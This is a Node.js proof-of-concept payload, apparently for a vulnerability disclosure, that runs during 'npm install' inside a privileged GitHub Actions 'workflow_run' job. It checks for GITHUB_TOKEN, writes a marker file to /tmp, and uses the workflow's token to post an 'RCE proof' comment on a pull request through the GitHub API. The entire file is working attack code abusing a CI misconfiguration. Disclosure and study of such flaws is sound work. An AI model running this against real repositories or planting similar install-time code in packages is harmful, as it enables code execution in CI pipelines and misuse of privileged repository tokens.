const fs = require('fs');
const out = [];
out.push('RCE_IN_EXACT_TARGET_WORKFLOW token_present=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no') + ' repo=' + (process.env.GITHUB_REPOSITORY || 'none'));
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed');
if (process.env.GITHUB_STEP_SUMMARY) fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, out.join('\n') + '\n');
(async () => {
  try {
    const pr = fs.readFileSync('./pr-number.txt', 'utf8').trim();
    const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
      method: 'POST',
      headers: { authorization: 'Bearer ' + process.env.GITHUB_TOKEN, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
      body: JSON.stringify({ body: '**RCE proof** - attacker code executed during `npm install` in the privileged `workflow_run` job, using the workflow GITHUB_TOKEN.' })
    });
    if (process.env.GITHUB_STEP_SUMMARY) fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, 'token_comment_status=' + r.status + '\n');
  } catch (e) {
    if (process.env.GITHUB_STEP_SUMMARY) fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, 'token_comment_error=' + e.message + '\n');
  }
})();
